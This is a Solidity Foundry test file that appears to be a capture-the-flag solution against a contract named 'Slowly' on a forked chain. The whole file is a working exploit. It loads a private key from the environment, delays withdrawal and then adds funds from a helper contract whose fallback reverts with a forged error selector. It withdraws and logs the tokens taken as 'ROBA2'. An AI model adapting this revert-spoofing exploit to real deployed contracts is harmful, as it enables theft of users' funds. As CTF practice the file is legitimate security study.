// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract CTFSlowly is Test {
    uint256 pk;
    address user;
    string rpc;

    function setUp() public {
        pk = vm.envUint("PK");
        user = vm.envAddress("ADDR");
        rpc = vm.envString("RPC");

        vm.createSelectFork(rpc, 6613341);
    }

    function testSlowly() public {
        vm.startPrank(user);

        Pranker pranker = new Pranker();

        ISlowly slowly = ISlowly(0x39Ff56383DAe3c0198Ab98c0Da093980e611d3C2);
        address token = 0xF3aF54943d6ef98c2B083FC6e69d36019ee5459D;

        slowly.delayWithdrawal(100 ether);      // 1
        slowly.addFunds(address(pranker), 420); // 2

        uint balanceBefore = IERC20(token).balanceOf(user);

        slowly.withdraw();                      // 3

        console.log("ROBA2", IERC20(token).balanceOf(user) - balanceBefore);
    }
}

interface IERC20 {
    function balanceOf(address) external returns (uint);
}

contract Pranker {
    fallback() external {
        assembly {
            mstore(0, 0x5303ed8200000000000000000000000000000000000000000000000000000000)
            revert (0, 0x20)
        }
    }
}

interface ISlowly {
    function addFunds(address _from, uint256 _amount) external;
    function withdraw() external;
    function enableWithdrawals() external returns (bool);
    function nextWithdrawalTimestamp() external returns (uint256);
  function delayWithdrawal(
    uint256 _delayBySeconds
  ) external;
}